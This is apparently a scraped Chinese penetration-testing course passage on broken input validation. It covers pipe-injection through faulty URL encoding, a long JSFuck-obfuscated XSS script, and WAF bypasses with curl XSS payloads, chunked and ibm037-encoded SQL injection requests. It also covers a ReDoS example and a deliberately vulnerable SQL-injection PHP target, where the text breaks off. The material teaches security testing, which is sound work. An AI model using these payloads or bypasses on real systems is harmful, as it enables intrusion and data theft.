<p>我们再通过一个示例，来看看涉及编码及转义的攻击方式是如何发生的。</p>

<p>现在有这么一个聊天应用程序，它的前端Web应用程序与后端服务器之间要进行通信。因为后端是不执行身份验证或授权的遗留代码，所以我们必须在前端必须实现这个功能。聊天协议规定只支持两个命令SAY和BAN，而且BAN命令只有管理员才可以使用。每个参数必须由一个空格分隔，原始输入经过URL编码，消息协议允许在一行中执行多个以<code>｜</code>分隔的命令。</p>

<p>我们先看后端的代码：</p>

<pre><code class="language-php hljs"><span class="hljs-variable">$inputString</span> = <span class="hljs-title function_ invoke__">readLineFromFileHandle</span>(<span class="hljs-variable">$serverFH</span>);
<span class="hljs-comment"># generate an array of strings separated by the "|" character.</span>
@commands = <span class="hljs-title function_ invoke__">split</span>(/\|/, <span class="hljs-variable">$inputString</span>);

<span class="hljs-keyword">foreach</span> <span class="hljs-variable">$cmd</span> (@commands) {
  <span class="hljs-comment"># separate the operator from its arguments based on a single whitespace</span>
  (<span class="hljs-variable">$operator</span>, <span class="hljs-variable">$args</span>) = <span class="hljs-title function_ invoke__">split</span>(/ /, <span class="hljs-variable">$cmd</span>, <span class="hljs-number">2</span>);
  
  <span class="hljs-variable">$args</span> = <span class="hljs-title function_ invoke__">UrlDecode</span>(<span class="hljs-variable">$args</span>);
  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$operator</span> eq <span class="hljs-string">"BAN"</span>) {
    <span class="hljs-title function_ invoke__">ExecuteBan</span>(<span class="hljs-variable">$args</span>);
  }
  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$operator</span> eq <span class="hljs-string">"SAY"</span>) {
    <span class="hljs-title function_ invoke__">ExecuteSay</span>(<span class="hljs-variable">$args</span>);
  }
}
</code></pre>

<p>前端Web应用程序接收命令后，对其进行编码，然后发送到权限查看服务器执行授权的检查，然后再将命令发送给后端。</p>

<pre><code class="language-php hljs"><span class="hljs-variable">$inputString</span> = <span class="hljs-title function_ invoke__">GetUntrustedArgument</span>(<span class="hljs-string">"command"</span>);
(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$argstr</span>) = <span class="hljs-title function_ invoke__">split</span>(/\s+/, <span class="hljs-variable">$inputString</span>, <span class="hljs-number">2</span>);

/<span class="hljs-comment"># removes extra whitespace and also changes CRLF's to spaces/</span>
<span class="hljs-variable">$argstr</span> =~ s/\s+/ /gs;

<span class="hljs-variable">$argstr</span> = <span class="hljs-title function_ invoke__">UrlEncode</span>(<span class="hljs-variable">$argstr</span>);
<span class="hljs-keyword">if</span> ((<span class="hljs-variable">$cmd</span> eq <span class="hljs-string">"BAN"</span>) &amp;&amp; (! <span class="hljs-title function_ invoke__">IsAdministrator</span>(<span class="hljs-variable">$username</span>))) {
<span class="hljs-keyword">die</span> <span class="hljs-string">"Error: you are not the admin.\n"</span>;
}

/<span class="hljs-comment"># communicate with file server using a file handle/</span>
<span class="hljs-variable">$fh</span> = <span class="hljs-title function_ invoke__">GetServerFileHandle</span>(<span class="hljs-string">"myserver"</span>);

<span class="hljs-keyword">print</span> <span class="hljs-variable">$fh</span> <span class="hljs-string">"<span class="hljs-subst">$cmd</span> <span class="hljs-subst">$argstr</span>\n"</span>;
</code></pre>

<p>我们可以发现一个很明显的问题，虽然协议和后端都允许在一个请求中发送多个命令，但前端只打算发送一个命令。可是<code>UrlEncode</code>函数可能会留下<code>｜</code>字符。</p>

<p>也就是说，如果攻击者提供<code>SAY hello world|BAN user12</code>，前端会看到这是一个SAY命令，<code>$argstr</code> 就为<code>hello world | BAN user12</code>。由于命令是SAY，对BAN命令的检查会失败。前端会向后端发送URL编码的命令：</p>

<pre><code class="language-plain">SAY hello%20world|BAN%20user12
</code></pre>

<p>后端就会把这个解析为如下两条命令来运行：</p>

<pre><code class="language-plain">SAY hello world
BAN user12
</code></pre>

<p>但是请注意，如果前端使用正确的编码将<code>｜</code> 编码为<code>%7C</code> ，那么后端将只处理一个命令。</p>

<p>这就是一个典型的编码错误导致的输入验证失效的例子。</p>

<h2 id="编码及混淆">编码及混淆</h2>

<p>除了编码及转义，<strong>攻击者还可以通过编码混淆攻击来逃避输入的检查，为攻击区注入有害负载</strong>。这种攻击方式，就叫做编码及混淆。</p>

<p>客户端和服务器会使用各种不同的编码在系统之间传递数据，而当它们想要使用数据时就需要首先对其进行解码。</p>

<p>在构建攻击时，我们需要考虑有害负载的注入位置。如果可以根据关联环境推断出输入是如何被解码的，那么我们就可以知道，要用什么方式对有害负载进行编码。</p>

<p>在URL中，有一系列具有特殊含义的保留字符。例如，<code>&amp;</code>用作分隔符，它可以分隔查询字符串中的参数。基于URL的输入可能包含这些字符，比如用户搜索<code>Fish &amp; Chips</code>之类的内容会发生什么呢？</p>

<p>浏览器会自动对任何可能导致解析器歧义的字符进行URL编码。这意味着，用%字符和它们的二位十六进制代码替换它们，成为这样<code>[…]/?search=Fish+%26+Chips</code>，来确保<code>&amp;</code> 不会被误认为是分隔符。</p>

<p>任何基于URL的输入在分配给相关变量之前，都会在服务器端自动进行URL解码。这意味着，就大多数服务器而言，查询参数中的<code>%22</code>、<code>%3D</code>和<code>%3E</code>等序列分别与<code>“</code>、<code>&lt;</code>和<code>&gt;</code>字符同义。也就是说，我们可以通过URL注入URL编码的数据，它通常仍会被后端应用程序正确解释。</p>

<p>有时，我们可能会发现，WAF等在检查你的输入时，无法正确地对你的输入进行 URL解码。在这种情况下，我们只需对列入黑名单的任何字符或单词进行编码，就可以将有害负载绕过检测，发送给后端应用程序，实现攻击行为。</p>

<p>在XSS注入中，我们经常会需要输入<script>进行攻击，但是往往输入检测会将它拦截，使得我们无法成功攻击，这时我们就可以对它进行编码混淆，将它改为：</p>

<pre><code>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()(([]+[])[(![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(![]]+[][[]])[+!+[]+[+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[+[]]+([]+[])[(![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[!+[]+!+[]])
</code></pre>

<p>利用这个方法，我们可以绕过很多的输入检测。</p>

<h2 id="总结">总结</h2>

<p>好了，今天的主要内容就到这里，我们一起小结下。</p>

<p>今天这节课，我们一起学习了不安全的输入检查、中间件的输入输出、不安全的映射、编码及转义、编码及混淆，这5种失效的输入检测是如何产生的。</p>

<p>不安全的输入检查，主要就是应用没有正确地过滤用户的输入，使得攻击者使用精心设计的恶意输入，成功实现对系统的攻击。</p>

<p>中间件的输入输出问题，是因为应用的中间组件在接收到其他组件的输入数据时，没有正确地对这个输入进行过滤所导致的问题。它的危害性极大，攻击者可以凭此实现任意命令的执行。</p>

<p>不安全的映射，发生在应用程序需要执行外部文件，而这个外部文件可以由攻击者上传的情况下。这主要是因为，应用程序没有对这个外部文件进行足够的限制所导致的。</p>

<p>对于编码及转义、编码及混淆这两个问题，它们都是编码相关的问题，区别在于：编码及转义问题，主要是因为系统没有对特殊字符做转义处理，使得攻击者可以借助这些特殊字符实现攻击行为；而编码及混淆问题，主要是系统只对一些危险的字符串进行了限制，却没有对这些字符对应的混淆编码进行拦截，导致攻击者可以凭借将恶意输入进行混淆，从而实现恶意输入的上传。</p>

<p>我把这些重点信息也提炼到一张思维导图中，你可以保存下来，方便复习：</p>

<p><img src="assets/b25a9f536bdb483d828fbd30ffcdd5bf.jpg" alt="" /></p>

<p>在下一讲中，我会和你一起学习失效的输入检测中最复杂的一部分WAF检测，以及如何让自己的应用避免失效的输入检测问题的发生。</p>

<h2 id="思考">思考</h2>

<p>学完这一讲，请你思考下，失效的输入检测问题的核心到底是什么呢？你能想到什么好办法解决这一类问题吗？</p>

<p>欢迎在评论区留下你的思考。如果你觉得今天的内容对你有所帮助的话，欢迎你把课程分享给其他同事或朋友，我们共同学习进步！</p>
</div>
                        </div>
                        <div>
                            <div id="prePage" style="float: left">

                            </div>
                            <div id="nextPage" style="float: right">

                            </div>
                        </div>

                    </div>
                </div>
            </div>
            <div class="copyright">
                <hr />
                <p>© 2019 - 2023 <a href="mailto:lll941107@gmail.com" target="_blank">Liangliang Lee</a>.
                    Powered by <a href="https://github.com/gin-gonic/gin" target="_blank">gin</a> and <a
                        href="https://github.com/kaiiiz/hexo-theme-book" target="_blank">hexo-theme-book</a>.</p>
            </div>
        </div>
        <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
    </div>
</body>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-NPSEEVD756"></script>

<script src="/static/index.js"></script>

<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;8c37c1b0996775d3&quot;,&quot;version&quot;:&quot;2024.8.0&quot;,&quot;r&quot;:1,&quot;serverTiming&quot;:{&quot;name&quot;:{&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true}},&quot;token&quot;:&quot;1f5d475227ce4f0089a7cff1ab17c0f5&quot;,&quot;b&quot;:1}" crossorigin="anonymous"></script>
</p></div></div><div class="book-post">
                            
                            <div align="center">因收到Google相关通知，网站将会择期关闭。<a target="_blank" href="https://lumendatabase.org/notices/44265620">相关通知内容</a><hr></div>
                            
                            <p id="tip" align="center"></p>
                            <h1 id="title" data-id="20 失效的输入检测（下）：攻击者有哪些绕过方案？" class="title">20 失效的输入检测（下）：攻击者有哪些绕过方案？</h1>
                            <div><p>你好，我是王昊天。今天我们继续来学习失效的输入检测相关的内容。</p>

<p>WAF这个词，相信你或多或少听说过，也可能会学习过绕WAF知识的分享。不过WAF及绕过，确实是失效的输入检测中，比较复杂的一种，所以我身边很多朋友和我反馈，还是不太明白WAF到底是什么意思，又如何去绕WAF。</p>

<p>今天我们就重点学习下这个问题吧。</p>

<h2 id="waf及绕过">WAF及绕过</h2>

<p>WAF的全称是Web应用防火墙，是Web Application Firewall的缩写，是网站常用来保护Web应用安全的一种安全产品。</p>

<p>WAF的主要功能是，通过检测客户端的请求内容，拦截具有潜在危险性的请求，以有效防御一些常见的针对 Web 应用的攻击，比如SQL注入、XSS等。所以，现在的中、大型网站基本都部署了WAF产品。</p>

<p>对于一名渗透测试人员来说，如果没有掌握 WAF 的基本绕过方法，在渗透测试过程中就会举步维艰。下面我们一起看看怎么进行WAF绕过。</p>

<p>我整理了下WAF绕过的9种常见方式，如下图所示。掌握了这9种绕过方式，你基本也就能应对大部分WAF绕过问题了。</p>

<p><img src="assets/f40154f43ecc45248a8b9510a2fbed76.jpg" alt="图片"></p>

<h3 id="http参数污染">HTTP参数污染</h3>

<p>我们先看HTTP参数污染。HTTP协议允许同名参数存在，<strong>如果WAF对同名参数的处理方式不当，就会造成参数污染</strong>。</p>

<p>假设提交的参数为<code>id=1&amp;id=2&amp;id=3</code>，WAF有可能会把id解析为1，而后端的解析结果可能是3。这时候，攻击者只需要把攻击内容放在第3个参数，就能绕过WAF的检测。</p>

<p>这种绕过方法非常经典，不过因为WAF的更新维护，这个方法现在已经基本行不通了。但我们还是可以从这个例子学习绕过的思路。</p>

<p>具体到各个服务器对参数的解释方法，我放在了一张图中。这张图你不需要特别记住每个参数，具体用到的时候再查阅即可。</p>

<p><img src="assets/8cfba2ac26f84efda77657ba9a01b586.jpg" alt="图片"></p>

<p>接下来，我们开始学习另一个绕过WAF的方法：HTTP Header欺骗，看看它是怎么发生的。</p>

<h3 id="http-header欺骗">HTTP Header欺骗</h3>

<p>有时候WAF会根据内置的白名单策略放行特定来源的请求包，例如来源本地IP地址。如果我们利用burpsuite，来修改HTTP请求包头部中的请求地址为127.0.0.1，实现伪造地址为应用的本地地址，就可以实现绕过WAF。</p>

<p>下面，我们会学习和参数污染相类似的一个绕WAF的方法。</p>

<h3 id="http-参数溢出">HTTP 参数溢出</h3>

<p>出于对性能的考虑，对参数非常多的请求，一些WAF只会检测其中一部分（比如前100个）参数。这种情况下，攻击者可以制造大量的无关参数用来“占位”，把真正的恶意参数放在后面。</p>

<p>WAF检测完前面一部分参数后没有发现问题，就放行了这个请求。这时候，攻击者就成功绕过了WAF的检测，把恶意参数带入了后端。</p>

<p>同样是出于对性能的考虑，一些WAF对于超长的数据包也会跳过。对于攻击者来说，他们可以构造超长的数据包，来绕过WAF的检测。</p>

<p>我们看个具体的例子。</p>

<pre><code class="language-plain">我们对某网站先请求一个POST的XSS Payload，被拦截。
curl -v -d 'a=&lt;img src=x onerror=alert(/xss/)&gt;' xxx.com

之后通过Fuzz发现，当增加参数个数达到一定的量，例如100个之后，带着XSS Payload就不会被拦截了，并且网站可以正常访问。
curl -v -d 'a1=1&amp;a2=2&amp;......&amp;a100=&lt;img src=x onerror=alert(/xss/)&gt;' xxx.com
</code></pre>

<p>在这个示例中，攻击者可以通过增加参数个数实现绕过WAF。理解了HTTP参数溢出问题之后，我们进入到对HTTP分块传输绕WAF的学习中。</p>

<h3 id="http-分块传输">HTTP 分块传输</h3>

<p>分块传输是一种传输编码，是把报文分割成若干个大小已知的“块”进行传输。</p>

<p>我们可以利用burpsuite，将请求报文中的<code>Transfer-Encoding</code>字段指定为<code>chunked</code>值，来声明采用分块传输。这样就可以把一个完整的攻击数据分割成若干份，WAF由于无法匹配到完整的攻击特征值，因此就可能会被绕过。</p>

<p>几乎所有可以识别<code>Transfer-Encoding</code>数据包的WAF，都没有处理分块数据包中长度标识处的注释。这就意味着，如果在分块数据包中加入注释的话，WAF识别不出这个数据包。</p>

<p>我们看个具体的例子。</p>

<pre><code class="language-plain">&lt;?php
header("Content-Type: text/html;charset=utf-8");
$id = $_REQUEST["id"];
if ($id){
    echo $id;
    }
?&gt;
</code></pre>

<p>这段代码是我们测试用的网页代码，我们先用GET方式上传参数，将id设置为：</p>

<pre><code class="language-plain">1 and 1=1
</code></pre>

<p>获取到的响应如下：</p>

<p><img src="assets/350afe5cb0d049d0a4a4bdeea116ec50.jpg" alt="图片"></p>

<p>根据响应我们可以发现这个payload被WAF拦截，这时候，我们利用分块传输来进行绕过：</p>

<pre><code class="language-plain">POST /xxxxxx.php HTTP/1.1
......
Transfer-Encoding: Chunked

1;
i
d
=1
5
a
6
nd
2
1=1
0
</code></pre>

<p>获取到的响应为：</p>

<p><img src="assets/0c249606472147e8bacf117ad8931463.jpg" alt="图片"></p>

<p>可以看到页面输出1，这个payload已经不再被拦截了。</p>

<p>好了，我们继续学习对HTTP数据编码绕WAF的方式。</p>

<h3 id="http-数据编码">HTTP 数据编码</h3>

<p>我们可以利用burpsuite实现修改报文头<code>Content-Type</code>，从而指定一个特殊编码，例如ibm037、ibm500、cp875和ibm1026等不常见的编码，就可能使服务器可以正常解析但WAF无法解析请求包内容，继而实现绕过WAF的检测。</p>

<p>我们看一个具体的示例，来加深理解。</p>

<pre><code class="language-plain">#这是未经特殊编码的原始请求
POST /sample.aspx?id1=something HTTP/1.1
HOST: victim.com
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Content-Length: 41

id2=‘union all select * from users—

#经过ibm037编码，我们可以将它转化为下面的请求，从而绕过WAF
POST /sample.aspx?%89%84%F1=%A2%96%94%85%A3%88%89%95%87 HTTP/1.1
HOST: victim.com
Content-Type: application/x-www-form-urlencoded; charset=ibm037
Content-Length: 115

%89%84%F2=%7D%A4%95%89%96%95%40%81%93%93%40%A2%85%93%85%83%A3%40%5C%40%86%99%96%94%40%A4%A2%85%99%A2%60%60
</code></pre>

<p>在这个示例中，我们指定了编码方式为ibm037，由于WAF无法解析成功，导致拦截失败。这就是WAF通过HTTP数据编码来实现绕过WAF的方式。</p>

<h3 id="http-协议未覆盖">HTTP 协议未覆盖</h3>

<p>HTTP协议覆盖问题引发的WAF绕过方式，其发生原因是：我们可以修改参数提交方式导致WAF使用错误的方式检测请求内容，从而绕过WAF的检测。</p>

<p>我们先回顾下4种常见的Content-Type类型：text/html、application/json、application/x-www-form-urlencoded以及multipart/form-data。<strong>利用协议未覆盖来绕过，其实就是尝试替换Content-Type来绕过WAF过滤机制。</strong></p>

<p>有的WAF未覆盖协议form-data，或是检测到form-data以后只当作文件上传来检测。但是，form-data不仅能支持文件上传，还能支持传键值对，所以在<code>x-www-form-urlencoded</code>下被拦截的数据包，能通过将Content-Type改为form-data的方法绕过一部分的WAF。</p>

<h3 id="http-畸形包">HTTP 畸形包</h3>

<p>我们继续看看HTTP畸形包问题。</p>

<p>当前的 HTTP 服务，依据的是RFC2616标准（通常有以下8种方法：OPTIONS、GET、HEAD、POST、PUT、DELETE、TRACE、CONNECT）的HTTP请求。</p>

<p>但是，当向Web服务器发送畸形请求（非标准的 HTTP 数据包）时， Web 服务器出于兼容性考虑，会尽力解析这些畸形的数据包，而WAF处理这种畸形包时就可能不拦截。其实，在HTTP管道化的绕过中，我们也用到了它来绕过。</p>

<h3 id="http-管道化">HTTP 管道化</h3>

<p>通过HTTP管道化的方式绕过WAF的原理是：HTTP管道化，允许多个HTTP请求通过一个套接字同时被输出，而不用等待相应的响应。请求者会等待各自的响应，这些响应是按照之前的请求顺序依次到达。因为多个请求可被同时传送，如果WAF只检测第一个请求而忽略了后面的请求，就可以被绕过。</p>

<p>利用这个方法绕过WAF的步骤是：</p>

<ul>
<li>先把HTTP协议的<code>Connection</code>字段设置为<code>keep-alive</code></li>
<li>之后把<code>Content-Length</code>设置为想要的值，来隐藏后面的威胁信息-
例如，原HTTP数据包为<code>a=1</code>，我们将<code>Content-Length</code>设置为3，然后用畸形包<code>a=1GET XXX HTTP/1.1</code>，（到此不换行），再换行跟上<code>Host</code>和<code>Connection</code>等信息，使得<code>GET XXX HTTP/1.1</code>达到绕过WAF检查的效果。</li>
</ul>

<p>以上就是8种常见的WAF及绕过了。这8种方式，不一定要独立使用，还可以进行灵活组合，形成HTTP组合绕过方式，实现<code>WAF</code>的绕过。而且这样成功绕过的概率也会提高。</p>

<h3 id="http-组合绕过">HTTP 组合绕过</h3>

<p>其实，组合绕过的核心思想，就是运用WAF和服务端的协议解析差异，使得服务端能够解析我们的消息，而WAF无法解析所以跳过检测。</p>

<p>以上就是WAF及绕过的9种常见方式了，至此，我们也就把失效的输入检测的6种方式学完了。</p>

<p>掌握了失效的输入检测原理及产生原因后，我们再通过两个实战案例夯实下这部分基础。</p>

<h2 id="两个案例带你深入理解失效的输入检测">两个案例带你深入理解失效的输入检测</h2>

<h3 id="案例一-因为-正则表达式算法触发失效的输入检测的示例">案例一：<strong>因为</strong>正则表达式算法触发失效的输入检测的示例</h3>

<p>正则表达式可以方便我们做字符串搜索及匹配，但是错误的使用方式也会导致易受外部攻击。我要展开的这个案例，就是一种拒绝服务攻击，它利用了正则表达式的一种特性：正则表达式本身会进行较为复杂的判断，如果触发极端情况就会让程序运行变得很慢。攻击者可以故意让程序使用正则表达式，来触发这种极端情况，并且让程序等待很久。</p>

<p>我们先来看下这种极端情况是如何产生的。</p>

<p>这种极端情况，<strong>来源于有问题的正则算法</strong>。这样的算法构建了一个非确定性的有限自动状态机（NFA），既然它是一个有限状态机，那对于每对状态和输入符号，可能都有多个下一个状态。然后引擎开始进行转换，直到输入结束。</p>

<p>由于存在多种可能的下一个状态，导致算法一一尝试所有可能的路径，直到找到匹配项，或者尝试所有路径但都失败。我们看一个例子。</p>

<p>正则表达式 ^(a+)+$ 可以由以下NFA表示：</p>

<p><img src="assets/9eeb6c65c3824515aab2d7831e333ee9.jpg" alt="图片"></p>

<p>当输入为aaaaX时，在上图中就有16种可能的路径，例如1-&gt;2-&gt;3-&gt;3-&gt;3。这就是其中之一，由于该路径匹配结果为aaaaa与aaaaX不一致，所以匹配失败。然后，继续匹配下一条路径，因为该输入无法匹配成功，所以最终需要遍历到所有的可能路径。对应到该输入，需要匹配所有的16条路径。</p>

<p>对于输入为aaaaX来说，这个输入遍历的路径还不是很多，但是当输入为aaaaaaaaaaaaaaaaX时，一共有65536条可能的路径，需要遍历的路径就变得非常多了。</p>

<p><strong>这个问题，是由一个叫做回溯的正则表达式引擎功能引发的。当输入不匹配时，引擎会返回到之前的位置，在那里重新采取不同的路径，直到探索完所有可能的路径为止。</strong></p>

<p>在我看来，这是因为正则表达式算法不成熟导致的。实际上正则表达式算法可以改得更高效，来避免这种问题的发生，但不幸的是出于某些原因，大多数正则表达式都会使用更简单的算法。</p>

<p>接下来，我们看一个攻击案例，引起正则表达式遍历问题的代码如下：</p>

<pre><code class="language-php hljs"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/(a+)+b$/"</span>,<span class="hljs-variable">$pass</span>)) {
              <span class="hljs-comment">/* store first result set */</span>
          <span class="hljs-keyword">echo</span> <span class="hljs-string">"match success"</span>;
      }
      <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">echo</span> <span class="hljs-string">"match failure"</span>;
      }
</code></pre>

<p>靶场已经集成在谜团上的“<a href="https://mituan.zone/#/course/2c9f843c7d0d2038017ddcaad23938f7" target="_blank">极客时间-漏洞挖掘与智能攻防实战</a>”里。</p>

<p>我们打开题目<code>ReDoS</code>，运行靶机。当我们的输入如下内容：</p>

<pre><code class="language-plain">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
</code></pre>

<p>系统会出现卡顿，过了一段时间后会出现匹配失败，回溯次数已用尽的提示信息。这是因为，PHP内置了正则匹配的回溯上限次数，当回溯次数超出该限制时，就会返回匹配失败。</p>

<p>这样的限制可以在输入检测失效的情况下，减轻ReDos对PHP应用的影响。</p>

<p>接下来，我们一起看一个绕WAF的实例。</p>

<h3 id="案例二-一个绕waf的实例">案例二：一个绕WAF的实例</h3>

<p>这个WAF，是最新版本的安全狗V4.0网页（APACHE）版。我们可以在谜团上打开靶场安全狗4.0。之后访问该网页的目录<code>inject.php</code>，它的代码如下：</p>

<pre><code class="language-php hljs">*<span class="hljs-meta">&lt;?php</span>*
<span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];
<span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(“localhost”,”root”,”root”);
*<span class="hljs-keyword">if</span>* (!<span class="hljs-variable">$con</span>){*<span class="hljs-keyword">die</span>*(‘Could not connect: ‘ . <span class="hljs-title function_ invoke__">mysql_error</span>());}
<span class="hljs-title function_ invoke__">mysql_select_db</span>(“dvwa”, <span class="hljs-variable">$con</span>);
<span class="hljs-variable">$query</span> = “SELECT first_name,last_name FROM users WHERE user_id = ‘<span class="hljs-variable">$id</span>’; “;
<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$query</span>)*<span class="hljs-keyword">or</span>* *<span class="hljs-keyword">die</span>*(‘&lt;pre&gt;’.<span class="hljs-title function_ invoke__">mysql_error</span>().’&lt;/pre&gt;’);
*<span class="hljs-keyword">while</span>*(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))
{
